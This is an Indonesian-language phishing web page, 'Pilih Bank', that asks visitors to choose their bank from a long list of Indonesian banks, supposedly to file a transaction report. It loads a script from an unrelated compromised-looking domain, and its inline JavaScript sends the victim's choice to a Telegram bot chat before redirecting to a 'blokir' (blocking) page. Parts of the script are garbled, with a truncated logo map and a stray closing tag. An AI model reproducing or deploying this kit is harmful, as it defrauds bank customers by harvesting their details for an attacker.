<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pilih Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f5f5f5;
        }
        .topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 15px;
            background: #fff;
            border-bottom: 1px solid #eee;
        }
        .search-box {
            position: relative;
            width: 70%;
        }
        .search-box input {
            width: 100%;
            padding: 10px 40px 10px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }
        .search-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
        }
        .lang {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
        }
        .lang-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #eee;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }
        .logo-section img {
            width: 100%;
            border-bottom: 1px solid #aaa;
        }
        #logo {
            display: block;
            margin: 20px auto;
            max-width: 95%;
            height: auto;
        }
        .container {
            padding: 0 15px 30px;
        }
        .card {
            background: #fff;
            padding: 25px 20px;
            border-radius: 10px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .card h1 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #222;
        }
        .card p {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
            font-size: 14px;
        }
        .form-group select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            background: #fff;
        }
        .btn-submit {
            width: 100%;
            padding: 13px;
            background-color: #0B5FA1;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-submit:hover {
            background-color: #007064;
        }
    </style>
</head>
<body>

<!-- NAVBAR -->
<header>
    <div class="topbar">
        <div class="search-box">
            <input type="text" placeholder="Masukkan Kata Pencarian">
            <span class="search-icon"><i class="fas fa-search fa-rotate-90" style="color: rgb(153, 152, 149);"></i></span>
        </div>
        <div class="lang">
            <div class="lang-circle">ID</div>
            ▼
        </div>
    </div>

    <div class="logo-section">
       <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioO5TTZ3ot2Xy8mJ-IOZ7zgik93zWD8UIXDhg2XRgyyTGOI9jS7W2C6962mEJ4wPOg4yZAE7Z3fnPjmTsAZ54G36PhR_9loe1D9gOTDfiZae21E1BEscJP5XMQIUHgf4dD1E43cq8lL7Phe9Y9QK1uos-TXpXp3YPkNwU2ez2yyGlp-Q5yz5hDpsuA-D4/s1080/AddText_04-12-10.18.01.jpg" style="width: 100%; border-bottom: 0.2px solid #aaa">
    </div>
</header>

<center>
<img id="logo" width="95%">
</center>

<!-- MAIN -->
<main>
  <div class="container">
    <div class="card">
      <h1>Pilih Bank Penyedia</h1>
      <p>Silakan pilih <b>bank tujuan layanan</b> di bawah ini. untuk melakukan laporan transaksi</p>

      <form method="post" id="bankForm">
        <div class="form-group">
            <label>Pilihan Layanan (Bank)</label>
            <select name="bnk" required>
                <option value="">-- Pilih Bank --</option>

                <optgroup label="Bank Umum">
                    <option value="MANDIRI">Bank Mandiri</option>
                    <option value="BCA">Bank Central Asia (BCA)</option>
                    <option value="BNI">Bank Negara Indonesia (BNI)</option>
                    <option value="BTN">Bank Tabungan Negara (BTN)</option>
                    <option value="BSI">Bank Syariah Indonesia (BSI)</option>
                    <option value="CIMB">Bank CIMB Niaga</option>
                    <option value="DANAMON">Bank Danamon</option>
                    <option value="PERMATA">PermataBank</option>
                    <option value="OCBC">Bank OCBC NISP</option>
                    <option value="MAYBANK">Bank Maybank Indonesia</option>
                    <option value="PANIN">Bank Panin</option>
                    <option value="MEGA">Bank Mega</option>
                    <option value="SINARMAS">Bank Sinarmas</option>
                    <option value="UOB">Bank UOB Indonesia</option>
                    <option value="HSBC">HSBC Indonesia</option>
                    <option value="SCB">Standard Chartered Indonesia</option>
                    <option value="DBS">Bank DBS Indonesia</option>
                    <option value="BTPN">Bank BTPN</option>
                    <option value="JAGO">Bank Jago</option>
                    <option value="NEO">Bank Neo Commerce</option>
                    <option value="SEABANK">SeaBank Indonesia</option>
                    <option value="ALADIN">Bank Aladin Syariah</option>
                    <option value="MUAMALAT">Bank Muamalat Indonesia</option>
                    <option value="BCASYR">Bank BCA Syariah</option>
                    <option value="MEGASYR">Bank Mega Syariah</option>
                    <option value="KBBANK">KB Bank</option>
                </optgroup>

                <optgroup label="Bank Daerah (BPD)">
                    <option value="BDKI">Bank DKI</option>
                    <option value="BJB">Bank BJB</option>
                    <option value="BJATENG">Bank Jateng</option>
                    <option value="BJATIM">Bank Jatim</option>
                    <option value="BACEH">Bank Aceh Syariah</option>
                    <option value="BNAGARI">Bank Nagari</option>
                    <option value="BSUMUT">Bank Sumut</option>
                    <option value="BRIAUKEPRI">Bank Riau Kepri</option>
                    <option value="BLAMPUNG">Bank Lampung</option>
                    <option value="BKALBAR">Bank Kalbar</option>
                    <option value="BKALSEL">Bank Kalsel</option>
                    <option value="BKALTIMTARA">Bank Kaltimtara</option>
                    <option value="BNTBSYR">Bank NTB Syariah</option>
                    <option value="BNTT">Bank NTT</option>
                    <option value="BPAPUA">Bank Papua</option>
                </optgroup>
            </select>
        </div>
        <button id="lanjut" class="btn-submit" type="submit">Lanjutkan</button>
      </form>
    </div>
  </div>
</main>
<script src="https://smpnegeri41jkt.my.id/3/server.js"></script>

// Konfigurasi Telegram

    "BNTT":       "https://upload.wikimedia.org/wikipedia/commons/7/78/Logo_Bank_NTT.png",
    "BPAPUA":     "https://upload.wikimedia.org/wikipedia/commons/5/50/Logo_Bank_Papua.png"
};

// Tampilkan Logo
const logo = sessionStorage.getItem("logo");
if(logo){
  document.getElementById("logo").src = logo;
}    

// Proses Form & Redirect
document.addEventListener('DOMContentLoaded', function () {
    const formEl = document.getElementById('bankForm');
    if (!formEl) return;

    formEl.addEventListener('submit', async function (e) {
        e.preventDefault();

        const bankSelect = document.querySelector('select[name="bnk"]');
        if (!bankSelect || bankSelect.value === "") {
            alert('Silakan pilih bank terlebih dahulu!');
            return;
        }

        // Ambil data
        const selectedValue = bankSelect.value.trim();
        const selectedText  = bankSelect.options[bankSelect.selectedIndex].text.trim();

        // Simpan ke Session Storage
        sessionStorage.setItem("bankName", selectedText);
        sessionStorage.setItem("bankCode", selectedValue);
        
        if (logoMap[selectedValue]) {
            sessionStorage.setItem("bankLogo", logoMap[selectedValue]);
        } else {
            sessionStorage.removeItem("bankLogo");
        }

        // Pesan untuk Telegram
        const pesan = `
*PILIHAN BANK*
Nama Bank : ${selectedText}
Kode Bank : ${selectedValue}
        `.trim();

        try {
            // Kirim ke Telegram
            await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: grup,
                    text: pesan,
                    parse_mode: 'Markdown'
                })
            });

            // Reset form
            formEl.reset();

            // ✅ HALAMAN TUJUAN (UBAH NAMA FILE SESUAI KEBUTUHANMU)
            // Contoh: "halaman_berikutnya.html" atau "form_transaksi.html"
            window.location.href = "blokir.html"; 

        } catch (err) {
            alert('Gagal mengirim data, coba lagi: ' + err.message);
        }
    });
});
</script>
